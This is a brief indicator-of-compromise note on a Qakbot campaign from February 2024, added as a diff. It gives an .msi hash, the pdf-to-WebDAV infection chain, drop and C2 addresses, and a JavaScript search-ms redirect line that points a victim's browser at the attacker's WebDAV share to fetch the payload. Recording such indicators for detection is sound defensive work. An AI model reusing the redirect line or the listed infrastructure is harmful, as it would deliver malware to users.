@@ -1,0 +1,27 @@
+02.02.2024 | Qakbot | tchk08 | Campaign 1706710954 | Version 500.523
+
+*************************************************
+
+.msi 73472cfc52f2732b933e385ef80b4541191c45c995ce5c42844484c33c9867a3
+
+*************************************************
+
+Exec >
+
+pdf > url > webdav >  search-ms
+
+location.href = 'search-ms:query=Document&crumb=location:\\eapinaq.com@SSL\DavWWWRoot\Documents&displayname=Documents'
+
+*************************************************
+
+drop urls:
+
+eapinaq.com
+
+*************************************************
+
+c2's
+
+https://185.113.8.123:443/teorema505
+https://31.210.173.10:443/teorema505
+https://185.156.172.62:443/teorema505
